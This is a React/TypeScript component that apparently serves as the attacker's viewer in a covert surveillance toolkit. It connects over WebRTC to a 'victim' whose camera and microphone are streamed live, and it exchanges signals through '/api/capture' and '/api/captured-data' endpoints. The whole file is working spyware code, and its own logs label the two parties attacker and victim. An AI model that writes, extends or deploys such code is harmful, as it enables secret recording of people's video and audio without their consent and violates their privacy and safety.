'use client'

import { useEffect, useRef, useState } from 'react'
import { Camera, Mic, Wifi, WifiOff } from 'lucide-react'

interface WebRTCViewerProps {
  sessionId: string
}

const rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' }
  ]
}

export default function WebRTCViewer({ sessionId }: WebRTCViewerProps) {
  const [connectionState, setConnectionState] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected')
  const [hasVideo, setHasVideo] = useState(false)
  const [hasAudio, setHasAudio] = useState(false)
  const videoRef = useRef<HTMLVideoElement>(null)
  const pcRef = useRef<RTCPeerConnection | null>(null)
  const remoteStreamRef = useRef<MediaStream | null>(null)
  
  useEffect(() => {
    let pollInterval: NodeJS.Timeout
    
    const initWebRTC = async () => {
      console.log('🎥 Initializing WebRTC viewer for session:', sessionId)
      setConnectionState('connecting')
      
      // Create peer connection
      const pc = new RTCPeerConnection(rtcConfig)
      pcRef.current = pc
      
      // Handle incoming stream
      pc.ontrack = (event) => {
        console.log('📹 Received remote track:', event.track.kind)
        
        if (!remoteStreamRef.current) {
          remoteStreamRef.current = new MediaStream()
        }
        
        remoteStreamRef.current.addTrack(event.track)
        
        if (videoRef.current) {
          videoRef.current.srcObject = remoteStreamRef.current
        }
        
        if (event.track.kind === 'video') setHasVideo(true)
        if (event.track.kind === 'audio') setHasAudio(true)
      }
      
      // Handle connection state changes
      pc.onconnectionstatechange = () => {
        console.log('🔌 Connection state:', pc.connectionState)
        if (pc.connectionState === 'connected') {
          setConnectionState('connected')
        } else if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
          setConnectionState('disconnected')
        }
      }
      
      // Create offer
      const offer = await pc.createOffer()
      await pc.setLocalDescription(offer)
      
      // Send offer via HTTP (simulating signaling)
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'webrtc_signal',
          sessionId,
          data: {
            type: 'offer',
            offer: offer
          }
        })
      })
      
      // Poll for answer and ICE candidates (reduced frequency)
      pollInterval = setInterval(async () => {
        try {
          // Check for WebRTC signals in captured data
          const response = await fetch('/api/captured-data')
          const data = await response.json()
          
          const signals = data.filter((item: any) => 
            item.sessionId === sessionId && item.type === 'webrtc_signal'
          )
          
          for (const signal of signals) {
            if (signal.webrtc_answer && !pc.remoteDescription) {
              console.log('📥 Received answer')
              await pc.setRemoteDescription(new RTCSessionDescription(signal.webrtc_answer))
            }
            
            if (signal.webrtc_candidate && signal.signal_type === 'ice-candidate-answer') {
              console.log('🧊 Attacker received ICE candidate from victim')
              await pc.addIceCandidate(new RTCIceCandidate(signal.webrtc_candidate))
            }
          }
        } catch (error) {
          console.error('Polling error:', error)
        }
      }, 2000) // Reduced from 1000ms to 2000ms
      
      // Handle ICE candidates
      pc.onicecandidate = async (event) => {
        if (event.candidate) {
          console.log('🧊 Sending ICE candidate to victim')
          await fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'webrtc_signal',
              sessionId,
              data: {
                type: 'ice-candidate-offer',
                candidate: event.candidate
              }
            })
          })
        }
      }
    }
    
    initWebRTC()
    
    return () => {
      if (pollInterval) clearInterval(pollInterval)
      if (pcRef.current) {
        pcRef.current.close()
      }
      if (remoteStreamRef.current) {
        remoteStreamRef.current.getTracks().forEach(track => track.stop())
      }
    }
  }, [sessionId])
  
  return (
    <div className="bg-gray-900 rounded-lg overflow-hidden border-2 border-red-500">
      <div className="relative">
        <video
          ref={videoRef}
          autoPlay
          playsInline
          className="w-full h-48 object-cover bg-black"
        />
        
        {/* Connection Status */}
        <div className="absolute top-2 right-2">
          {connectionState === 'connected' ? (
            <div className="bg-red-600 text-white px-2 py-1 rounded text-xs font-bold animate-pulse">
              🔴 LIVE
            </div>
          ) : connectionState === 'connecting' ? (
            <div className="bg-yellow-600 text-white px-2 py-1 rounded text-xs font-bold">
              📡 CONNECTING...
            </div>
          ) : (
            <div className="bg-gray-600 text-white px-2 py-1 rounded text-xs font-bold">
              <WifiOff size={12} className="inline" /> OFFLINE
            </div>
          )}
        </div>
        
        {/* Session ID */}
        <div className="absolute bottom-2 left-2 bg-black/70 text-white px-2 py-1 rounded text-xs font-mono">
          {sessionId.slice(0, 8)}...
        </div>
      </div>
      
      {/* Info Panel */}
      <div className="bg-black p-3 space-y-2">
        <div className="flex items-center gap-2 text-xs">
          <Camera size={14} className={hasVideo ? 'text-green-400' : 'text-gray-500'} />
          <span className={hasVideo ? 'text-green-400' : 'text-gray-500'}>
            Camera: {hasVideo ? 'STREAMING' : 'WAITING...'}
          </span>
        </div>
        
        <div className="flex items-center gap-2 text-xs">
          <Mic size={14} className={hasAudio ? 'text-purple-400' : 'text-gray-500'} />
          <span className={hasAudio ? 'text-purple-400' : 'text-gray-500'}>
            Microphone: {hasAudio ? 'ACTIVE' : 'WAITING...'}
          </span>
        </div>
        
        <div className="flex items-center gap-2 text-xs">
          <Wifi size={14} className={connectionState === 'connected' ? 'text-blue-400' : 'text-gray-500'} />
          <span className={connectionState === 'connected' ? 'text-blue-400' : 'text-gray-500'}>
            WebRTC: {connectionState.toUpperCase()}
          </span>
        </div>
      </div>
    </div>
  )
}